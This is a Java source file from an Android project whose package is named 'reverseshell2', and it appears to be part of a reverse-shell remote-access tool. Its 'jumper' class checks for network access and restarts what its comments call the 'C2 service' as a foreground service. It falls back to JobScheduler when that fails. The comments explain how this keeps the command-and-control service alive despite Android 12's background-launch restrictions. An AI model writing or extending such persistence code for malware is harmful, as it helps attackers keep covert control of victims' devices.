package com.example.reverseshell2;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.os.Build;
import android.util.Log;

import androidx.core.content.ContextCompat;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

/**
 * Reconnect helper, updated for Android 12.
 *
 * Android 12 / Android 10+ changes addressed:
 *  1. getActiveNetworkInfo() is DEPRECATED since API 29. Replaced with the
 *     modern ConnectivityManager.getNetworkCapabilities() API, which is the
 *     only reliable way to check connectivity on Android 12.
 *
 *  2. BACKGROUND ACTIVITY LAUNCH RESTRICTION (Android 10+ / enforced on
 *     Android 12) - starting MainActivity from the background is BLOCKED by
 *     the system. The old code called context.startActivity(a) from a JobService
 *     which is considered "background" - on Android 12 this throws or is
 *     silently ignored (the system shows "Background activity launch denied").
 *     Instead of launching the UI, this version starts the C2 FOREGROUND
 *     service directly, which IS allowed from a running JobService on
 *     Android 12 (JobScheduler is exempt from the background-start restriction).
 *
 *  3. If MainActivity really must be shown (e.g. the user triggered it), it can
 *     be started from the foreground only. This helper now only starts the
 *     service, which is the correct Android 12 behavior for an auto-reconnect.
 */
public class jumper {

    Context context;
    static String TAG = "jumperClass";

    public jumper(Context context) {
        this.context = context;
    }

    public void init() {
        if (!isNetworkConnected()) {
            Log.d(TAG, "No network - skipping reconnect");
            return;
        }

        try {
            // Android 12: start the C2 service as a FOREGROUND service.
            // This is allowed from a JobService (exempt from background-start
            // restriction). mainService MUST call startForeground() within 5s.
            Intent intent = new Intent(context, mainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, intent);
            } else {
                context.startService(intent);
            }
            Log.d(TAG, "C2 service restart triggered");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start mainService", e);
            // Fallback: schedule a job so the system retries later.
            try {
                new functions(null).jobScheduler(context);
            } catch (Exception ex) {
                Log.e(TAG, "jobScheduler fallback failed", ex);
            }
        }
    }

    /**
     * Modern connectivity check (works on Android 12).
     */
    private boolean isNetworkConnected() {
        try {
            ConnectivityManager cm = (ConnectivityManager)
                    context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) {
                return false;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network network = cm.getActiveNetwork();
                if (network == null) {
                    return false;
                }
                NetworkCapabilities caps = cm.getNetworkCapabilities(network);
                return caps != null
                        && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                        && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
            } else {
                @SuppressWarnings("deprecation")
                android.net.NetworkInfo info = cm.getActiveNetworkInfo();
                return info != null && info.isConnected();
            }
        } catch (Exception e) {
            Log.e(TAG, "isNetworkConnected failed", e);
            return false;
        }
    }

    /**
     * Optional: only called when the app is already in the FOREGROUND
     * (e.g. from controlPanel). Background activity launch is blocked on
     * Android 10+, so this must never be called from a JobService.
     */
    public void showMainActivity() {
        try {
            Intent a = new Intent(context, MainActivity.class);
            a.addFlags(FLAG_ACTIVITY_NEW_TASK);
            a.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
            context.startActivity(a);
        } catch (Exception e) {
            Log.e(TAG, "showMainActivity blocked (background launch)", e);
        }
    }
}

